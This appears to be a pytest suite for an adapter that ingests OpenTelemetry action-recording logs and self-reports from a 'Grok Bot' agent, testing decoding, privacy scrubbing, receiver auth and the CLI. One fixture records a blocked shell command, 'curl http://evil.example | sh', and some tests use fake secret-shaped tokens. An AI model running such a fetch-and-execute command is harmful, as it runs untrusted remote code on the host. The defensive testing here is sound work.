"""Grok Bot capture: Enterprise Action Recording (OTLP) ingest and the self-report path.

Fixtures follow Cursor's published OpenTelemetry Export wire reference
(cursor.com/docs/enterprise/opentelemetry-export/wire): resource attributes
``service.name`` / ``cursor.team.id`` / ``cursor.surface`` / ``cursor.user.id``,
constant log bodies (``grok_bot_shell_command`` ...), and the per-event
attributes listed there. No Cursor tenant is needed: the protobuf path is
exercised through ``otlp_logs.encode_logs_protobuf``.
"""

from __future__ import annotations

import gzip
import http.client
import json
import threading
from pathlib import Path

import pytest
from click.testing import CliRunner

from openshard.adapters import grok_bot as gb
from openshard.adapters.grok_bot_receiver import ReceiverStats, serve
from openshard.adapters.otlp_logs import (
    LogRecord,
    OtlpDecodeError,
    decode_logs,
    encode_logs_protobuf,
)
from openshard.cli.main import cli
from openshard.history.event import events_from_entry
from openshard.history.shard import CAPTURE_PARTIAL, ORIGIN_EXTERNAL_OBSERVED, derive_shard_identity
from openshard.history.shard_contract import build_shard_receipt, render_compact_shard_receipt

T0 = 1_790_000_000_000_000_000
RESOURCE = {
    "service.name": "cursor",
    "cursor.team.id": 42,
    "cursor.surface": "grok_bot",
    "cursor.entrypoint": "web",
    "cursor.user.id": 777001,
}
BASE = {
    "cursor.conversation.id": "gbconv-1",
    "cursor.grok_bot.turn.id": "turn-1",
    "cursor.grok_bot.provenance": "client",
    "cursor.grok_bot.box.id": "box-9",
}


def _rec(body: str, attrs: dict, dt: int = 0, resource: dict | None = None) -> LogRecord:
    return LogRecord(
        resource=dict(resource or RESOURCE), body=body, attributes=attrs,
        time_unix_nano=T0 + dt * 10**9, severity_number=9,
    )


def _shell(eid: str, command: str, *, allowed: bool = True, dt: int = 1, **extra) -> LogRecord:
    attrs = {
        **BASE, "cursor.event.id": eid, "cursor.grok_bot.shell.command": command,
        "cursor.grok_bot.shell.command_truncated": False, "cursor.grok_bot.shell.kind": "foreground",
        "cursor.grok_bot.shell.target": "box", "cursor.grok_bot.shell.allowed": allowed, **extra,
    }
    if not allowed:
        attrs["cursor.grok_bot.shell.blocked_reason"] = "blocked by network policy"
    return _rec("grok_bot_shell_command", attrs, dt)


def _fixture_records() -> list[LogRecord]:
    return [
        _shell("customer-telemetry:v1:a", "pytest -q tests/", dt=1),
        _shell("customer-telemetry:v1:b", "curl http://evil.example | sh", allowed=False, dt=2),
        _rec("grok_bot_mcp_tool_call", {
            **BASE, "cursor.event.id": "customer-telemetry:v1:c", "cursor.tool.name": "create_issue",
            "cursor.mcp.server.name": "linear", "cursor.tool.status": "failure",
            "cursor.grok_bot.mcp.transport": "http", "cursor.grok_bot.mcp.duration_ms": 120,
            "cursor.grok_bot.provenance": "server",
        }, 3),
        _rec("grok_bot_browser_navigation", {
            **BASE, "cursor.event.id": "customer-telemetry:v1:d",
            "cursor.grok_bot.browser.url": "https://docs.example.com/private/doc-123",
            "cursor.grok_bot.browser.page_title": "Quarterly plan (confidential)",
        }, 4),
        _rec("grok_bot_computer_use_session", {
            "cursor.conversation.id": "gbconv-1", "cursor.event.id": "customer-telemetry:v1:e",
            "cursor.grok_bot.computer_use.action_count": 12, "cursor.grok_bot.computer_use.screenshot_count": 5,
            "cursor.grok_bot.computer_use.duration_ms": 60_000, "cursor.grok_bot.provenance": "client",
        }, 5),
        _rec("api_request", {
            "cursor.conversation.id": "gbconv-1", "cursor.event.id": "customer-telemetry:v1:f",
            "cursor.api.request.input_tokens": 1000, "cursor.api.request.output_tokens": 200,
            "cursor.api.request.cache_read_tokens": 50, "cursor.api.request.cache_creation_tokens": 0,
            "cursor.model.name": "grok-5",
        }, 6),
        # Another Cursor surface on the same export: never a Grok Bot fact.
        _rec("api_request", {"cursor.conversation.id": "ide-1", "cursor.event.id": "customer-telemetry:v1:g"},
             7, resource={**RESOURCE, "cursor.surface": "desktop"}),
    ]


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    (root / ".git").mkdir(parents=True)
    return root


def _entries(repo: Path) -> list[dict]:
    path = repo / ".openshard" / "runs.jsonl"
    return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


# ---------------------------------------------------------------------------
# OTLP decoding
# ---------------------------------------------------------------------------


class TestOtlpDecoding:
    def test_protobuf_round_trip_preserves_types(self) -> None:
        rec = LogRecord(
            resource={"cursor.surface": "grok_bot", "cursor.team.id": 42},
            body="grok_bot_shell_command",
            attributes={"s": "x", "b": False, "i": -5, "d": 1.5, "arr": ["a", 2], "kv": {"k": "v"}},
            time_unix_nano=T0, severity_number=13, event_name="evt",
        )
        (out,) = decode_logs(encode_logs_protobuf([rec]), "application/x-protobuf")
        assert out.resource == rec.resource
        assert out.attributes == rec.attributes
        assert out.body == "grok_bot_shell_command"
        assert (out.time_unix_nano, out.severity_number, out.event_name) == (T0, 13, "evt")

    def test_gzip_body_is_decompressed(self) -> None:
        data = gzip.compress(encode_logs_protobuf(_fixture_records()))
        assert len(decode_logs(data)) == len(_fixture_records())

    def test_otlp_json_and_json_lines(self) -> None:
        doc = {"resourceLogs": [{
            "resource": {"attributes": [{"key": "cursor.surface", "value": {"stringValue": "grok_bot"}},
                                        {"key": "cursor.team.id", "value": {"intValue": "42"}}]},
            "scopeLogs": [{"logRecords": [{
                "timeUnixNano": str(T0), "severityNumber": 9, "body": {"stringValue": "grok_bot_mcp_tool_call"},
                "attributes": [{"key": "cursor.tool.status", "value": {"stringValue": "success"}},
                               {"key": "cursor.grok_bot.mcp.duration_ms", "value": {"intValue": "7"}}],
            }]}],
        }]}
        (one,) = decode_logs(json.dumps(doc).encode())
        assert one.resource == {"cursor.surface": "grok_bot", "cursor.team.id": 42}
        assert one.attributes["cursor.grok_bot.mcp.duration_ms"] == 7
        lines = (json.dumps(doc) + "\n" + json.dumps(doc) + "\n").encode()
        assert len(decode_logs(lines)) == 2

    @pytest.mark.parametrize("data", [b"\x0a\xff\xff", b"\x0a\x05abc", b"\x07", b"{not json"])
    def test_malformed_input_raises(self, data: bytes) -> None:
        with pytest.raises(OtlpDecodeError):
            decode_logs(data)


# ---------------------------------------------------------------------------
# Normalization
# ---------------------------------------------------------------------------


class TestNormalize:
    def test_only_grok_bot_surface_is_accepted(self) -> None:
        rec = _shell("e1", "ls")
        rec.resource = {**RESOURCE, "cursor.surface": "cloud_agent"}
        assert isinstance(gb.normalize_record(rec), gb.NormalizeSkip)

    def test_team_filter(self) -> None:
        assert isinstance(gb.normalize_record(_shell("e1", "ls"), team_id=42), gb.Observation)
        skip = gb.normalize_record(_shell("e1", "ls"), team_id=99)
        assert isinstance(skip, gb.NormalizeSkip) and skip.reason == "other_team"

    def test_requires_conversation_id_and_known_event(self) -> None:
        no_conv = _rec("grok_bot_shell_command", {"cursor.event.id": "x"})
        assert gb.normalize_record(no_conv).reason == "no_conversation_id"
        unknown = _rec("cursor.skill.activated", {**BASE, "cursor.event.id": "x"})
        assert gb.normalize_record(unknown).reason == "unsupported_event"

    def test_dotted_event_name_is_accepted(self) -> None:
        rec = _rec("", {**BASE, "cursor.event.id": "x", "cursor.grok_bot.browser.url": "https://a.example/b"})
        rec.body, rec.event_name = None, "cursor.grok_bot.browser_navigation"
        obs = gb.normalize_record(rec)
        assert isinstance(obs, gb.Observation) and obs.kind == gb.KIND_BROWSER

    def test_browser_keeps_host_only(self) -> None:
        obs = gb.normalize_record(_fixture_records()[3])
        assert obs.fields == {"host": "docs.example.com"}


# ---------------------------------------------------------------------------
# Enterprise ingest -> Shard -> Receipt
# ---------------------------------------------------------------------------


class TestOtelIngest:
    def test_one_conversation_one_shard_with_platform_observed_events(self, repo: Path) -> None:
        result = gb.ingest_otlp_bytes(encode_logs_protobuf(_fixture_records()), repo)
        assert result.accepted == 6
        assert result.skipped == {"not_grok_bot": 1}
        (entry,) = _entries(repo)
        assert entry["executor"] == gb.EXECUTOR_OTEL
        assert entry["capture"]["session_id"] == "gbconv-1"
        assert entry["capture"]["evidence_level"] == "platform_observed"
        label, origin, depth = derive_shard_identity(entry)
        assert (label, origin, depth) == ("Grok Bot (external)", ORIGIN_EXTERNAL_OBSERVED, CAPTURE_PARTIAL)

        events = entry["events"]
        assert len(events) == 5  # api_request carries usage, not an Event
        assert {e["evidence"] for e in events} == {"directly_observed"}
        assert {e["metadata"]["observer"] for e in events} == {"cursor_action_recording"}
        assert {e["source"] for e in events} == {"grok_bot_action_recording"}
        by_kind = {e["metadata"]["grok_bot_kind"]: e for e in events if e["event_type"] != "approval.denied"}
        assert by_kind["shell_command"]["event_type"] == "tool.invoked"
        assert by_kind["shell_command"]["status"] == "unknown"  # no exit code is exported
        assert by_kind["shell_command"]["metadata"]["exit_code_observed"] is False
        assert by_kind["mcp_tool_call"]["status"] == "failed"
        assert by_kind["mcp_tool_call"]["metadata"]["provenance"] == "server"
        assert by_kind["computer_use_session"]["metadata"]["action_count"] == 12
        denied = [e for e in events if e["event_type"] == "approval.denied"]
        assert len(denied) == 1 and denied[0]["status"] == "skipped"
        assert denied[0]["metadata"]["decided_by"] == "cursor_shell_policy"

        assert entry["prompt_tokens"] == 1000 and entry["completion_tokens"] == 200
        assert entry["cache_read_tokens"] == 50
        assert entry["tokens_provenance"] == "vendor_telemetry"
        assert entry["execution_model"] == "grok-5"
        assert "estimated_cost" not in entry
        assert entry["verification_passed"] is None
        assert entry["files_detail"] == []

    def test_never_stores_user_id_url_path_or_page_title(self, repo: Path) -> None:
        gb.ingest_otlp_bytes(encode_logs_protobuf(_fixture_records()), repo)
        raw = (repo / ".openshard" / "runs.jsonl").read_text(encoding="utf-8")
        assert "777001" not in raw
        assert "doc-123" not in raw and "/private" not in raw
        assert "confidential" not in raw

    def test_shell_command_secrets_are_scrubbed(self, repo: Path) -> None:
        secret = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
        rec = _shell("s1", f"git push https://x:{secret}@github.com/o/r.git")
        gb.ingest_log_records([rec], repo)
        assert secret not in (repo / ".openshard" / "runs.jsonl").read_text(encoding="utf-8")

    def test_reingest_is_idempotent_and_new_events_extend_the_same_shard(self, repo: Path) -> None:
        data = encode_logs_protobuf(_fixture_records())
        gb.ingest_otlp_bytes(data, repo)
        before = (repo / ".openshard" / "runs.jsonl").read_bytes()
        again = gb.ingest_otlp_bytes(data, repo)
        assert again.accepted == 0 and again.duplicates == 6
        assert (repo / ".openshard" / "runs.jsonl").read_bytes() == before

        first = _entries(repo)[0]
        more = gb.ingest_log_records([_shell("customer-telemetry:v1:z", "ruff check .", dt=30)], repo)
        assert more.conversations == {"gbconv-1": "replaced"}
        (entry,) = _entries(repo)
        assert entry["shard_id"] == first["shard_id"] and entry["receipt_id"] == first["receipt_id"]
        assert len(entry["events"]) == 6
        assert entry["capture"]["grok_bot"]["counts"]["shell_command"] == 3

    def test_separate_conversations_get_separate_shards(self, repo: Path) -> None:
        other = _shell("o1", "ls", dt=1)
        other.attributes["cursor.conversation.id"] = "gbconv-2"
        gb.ingest_log_records([_shell("a1", "ls"), other], repo)
        entries = _entries(repo)
        assert {e["capture"]["session_id"] for e in entries} == {"gbconv-1", "gbconv-2"}
        assert len({e["shard_id"] for e in entries}) == 2

    def test_check_commands_are_attempted_never_passed(self, repo: Path) -> None:
        gb.ingest_otlp_bytes(encode_logs_protobuf(_fixture_records()), repo)
        (entry,) = _entries(repo)
        v = entry["verification"]
        assert v["status"] == "unknown"
        assert v["source"] == "directly_observed"
        assert "outcome_not_observed" in v["incomplete_reasons"]
        assert v["checks_passed"] == 0

    def test_event_cap_marks_record_incomplete(self, repo: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(gb, "_MAX_EVENTS", 2)
        gb.ingest_log_records([_shell(f"e{i}", "ls", dt=i) for i in range(4)], repo)
        (entry,) = _entries(repo)
        assert len(entry["events"]) == 2
        assert entry["capture"]["hook_events_dropped"] == 2
        assert entry["capture"]["completeness"]["status"] == "incomplete"

    def test_receipt_labels_observer_and_unobservable_files(self, repo: Path) -> None:
        gb.ingest_otlp_bytes(encode_logs_protobuf(_fixture_records()), repo)
        (entry,) = _entries(repo)
        text = render_compact_shard_receipt(build_shard_receipt(entry))
        assert "Grok Bot (external)" in text
        assert "Directly observed (by Cursor Action Recording)" in text
        assert "Not observable" in text
        assert "OpenShard did not execute or verify" in text
        assert all(e.evidence == "directly_observed" for e in events_from_entry(entry))


# ---------------------------------------------------------------------------
# Consumer path: self-report
# ---------------------------------------------------------------------------


def _report(**overrides) -> str:
    doc = {
        "schema": gb.REPORT_SCHEMA,
        "report_id": "task-1",
        "task": "Fix the flaky login test",
        "status": "completed",
        "summary": "Patched the retry logic",
        "actions": [
            {"kind": "shell", "command": "pytest tests/test_login.py", "result": "passed"},
            {"kind": "mcp", "name": "github/create_pr", "result": "passed"},
        ],
        "files_changed": [{"path": "src/login.py", "change_type": "update"}],
        "checks": [{"command": "pytest tests/test_login.py", "result": "passed"}],
    }
    doc.update(overrides)
    return json.dumps(doc)


class TestSelfReport:
    def test_everything_is_agent_reported(self, repo: Path) -> None:
        out = gb.ingest_report(_report(), repo)
        assert out["evidence"] == "agent_reported"
        (entry,) = _entries(repo)
        assert entry["executor"] == gb.EXECUTOR_REPORT
        assert entry["capture"]["evidence_level"] == "agent_reported"
        assert {e["evidence"] for e in entry["events"]} == {"agent_reported"}
        assert all(e["metadata"].get("observer") is None for e in entry["events"])
        v = entry["verification"]
        assert (v["source"], v["observation_mode"]) == ("agent_reported", "agent_claim")
        assert entry["verification_passed"] is None
        assert entry["files_detail"][0]["attribution"] == "agent_reported"
        assert entry["capture"]["completeness"]["status"] == "incomplete"
        assert entry["capture"]["completeness"]["reasons"][0]["kind"] == "integration_limitation"
        assert derive_shard_identity(entry)[2] == CAPTURE_PARTIAL

    def test_receipt_never_reads_as_observed(self, repo: Path) -> None:
        gb.ingest_report(_report(), repo)
        (entry,) = _entries(repo)
        receipt = build_shard_receipt(entry)
        text = render_compact_shard_receipt(receipt)
        assert "(agent claim, not observed)" in text
        assert "Directly observed" not in text
        assert receipt.status == "Passed (agent claim)"

    def test_same_report_id_updates_in_place(self, repo: Path) -> None:
        gb.ingest_report(_report(status="partial"), repo)
        first = _entries(repo)[0]
        out = gb.ingest_report(_report(status="completed"), repo)
        assert out["outcome"] == "replaced"
        (entry,) = _entries(repo)
        assert entry["shard_id"] == first["shard_id"]
        assert entry["capture"]["reported_status"] == "completed"

    @pytest.mark.parametrize("bad", [
        "not json", "[]", json.dumps({"schema": "other", "task": "x"}),
        json.dumps({"schema": gb.REPORT_SCHEMA}),
        json.dumps({"schema": gb.REPORT_SCHEMA, "task": "x", "status": "great"}),
        json.dumps({"schema": gb.REPORT_SCHEMA, "task": "x", "actions": "ls"}),
    ])
    def test_invalid_reports_are_rejected(self, repo: Path, bad: str) -> None:
        with pytest.raises(gb.ReportError):
            gb.ingest_report(bad, repo)
        assert not (repo / ".openshard" / "runs.jsonl").exists()

    def test_report_secrets_are_scrubbed(self, repo: Path) -> None:
        secret = "sk-ant-" + "api03-" + "x" * 40
        gb.ingest_report(_report(actions=[{"kind": "shell", "command": f"export KEY={secret}"}]), repo)
        assert secret not in (repo / ".openshard" / "runs.jsonl").read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# Receiver
# ---------------------------------------------------------------------------


TOKEN = "t" * 32


@pytest.fixture
def receiver(repo: Path):
    box: dict = {}
    ready = threading.Event()
    stats = ReceiverStats()

    def _ready(server) -> None:
        box["server"] = server
        ready.set()

    thread = threading.Thread(
        target=serve, args=(repo, TOKEN), kwargs={"port": 0, "ready": _ready, "stats": stats}, daemon=True,
    )
    thread.start()
    assert ready.wait(10)
    yield box["server"].server_address[1], stats
    box["server"].shutdown()
    thread.join(10)


def _post(port: int, path: str, body: bytes, headers: dict) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        return resp.status, resp.read()
    finally:
        conn.close()


class TestReceiver:
    def test_requires_bearer_token(self, receiver, repo: Path) -> None:
        port, stats = receiver
        body = encode_logs_protobuf(_fixture_records())
        assert _post(port, "/v1/logs", body, {"Content-Type": "application/x-protobuf"})[0] == 401
        assert _post(port, "/v1/logs", body, {"Authorization": "Bearer wrong"})[0] == 401
        assert not (repo / ".openshard" / "runs.jsonl").exists()
        assert stats.to_dict()["rejected"] == 2

    def test_refuses_browser_requests(self, receiver) -> None:
        port, _ = receiver
        headers = {"Authorization": f"Bearer {TOKEN}", "Origin": "https://evil.example"}
        assert _post(port, "/v1/logs", b"", headers)[0] == 403

    def test_ingests_protobuf_logs_and_ignores_metrics(self, receiver, repo: Path) -> None:
        port, stats = receiver
        auth = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/x-protobuf"}
        status, body = _post(port, "/v1/logs", encode_logs_protobuf(_fixture_records()), auth)
        assert (status, body) == (200, b"")
        assert _post(port, "/v1/metrics", b"\x0a\x00", auth)[0] == 200
        assert stats.to_dict()["accepted"] == 6
        (entry,) = _entries(repo)
        assert entry["executor"] == gb.EXECUTOR_OTEL

    def test_undecodable_body_is_400(self, receiver) -> None:
        port, stats = receiver
        auth = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/x-protobuf"}
        assert _post(port, "/v1/logs", b"\x0a\xff\xff", auth)[0] == 400
        assert stats.to_dict()["decode_errors"] == 1

    def test_short_token_is_refused(self, repo: Path) -> None:
        with pytest.raises(ValueError):
            serve(repo, "short", port=0)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


class TestCli:
    def test_ingest_file(self, repo: Path, tmp_path: Path) -> None:
        export = tmp_path / "export.pb"
        export.write_bytes(encode_logs_protobuf(_fixture_records()))
        res = CliRunner().invoke(cli, ["grok-bot", "ingest", str(export), "--repo", str(repo), "--json"])
        assert res.exit_code == 0, res.output
        data = json.loads(res.output)
        assert data["accepted"] == 6 and data["conversations"] == 1

    def test_ingest_rejects_garbage(self, repo: Path, tmp_path: Path) -> None:
        bad = tmp_path / "bad.pb"
        bad.write_bytes(b"\x0a\xff\xff")
        res = CliRunner().invoke(cli, ["grok-bot", "ingest", str(bad), "--repo", str(repo)])
        assert res.exit_code != 0 and "Not a decodable OTLP logs export" in res.output

    def test_report_from_stdin(self, repo: Path) -> None:
        res = CliRunner().invoke(cli, ["grok-bot", "report", "-", "--repo", str(repo)], input=_report())
        assert res.exit_code == 0, res.output
        assert "agent_reported" in res.output

    def test_skill_output_matches_report_schema(self, tmp_path: Path) -> None:
        res = CliRunner().invoke(cli, ["grok-bot", "skill"])
        assert res.exit_code == 0
        assert gb.REPORT_SCHEMA in res.output and "openshard grok-bot report -" in res.output
        out = tmp_path / "skills" / "openshard-report" / "SKILL.md"
        res = CliRunner().invoke(cli, ["grok-bot", "skill", "--output", str(out)])
        assert res.exit_code == 0 and out.read_text(encoding="utf-8") == gb.SKILL_MARKDOWN

    def test_serve_requires_token_env(self, repo: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("OPENSHARD_GROK_BOT_OTLP_TOKEN", raising=False)
        res = CliRunner().invoke(cli, ["grok-bot", "serve", "--repo", str(repo)])
        assert res.exit_code != 0 and "OPENSHARD_GROK_BOT_OTLP_TOKEN" in res.output
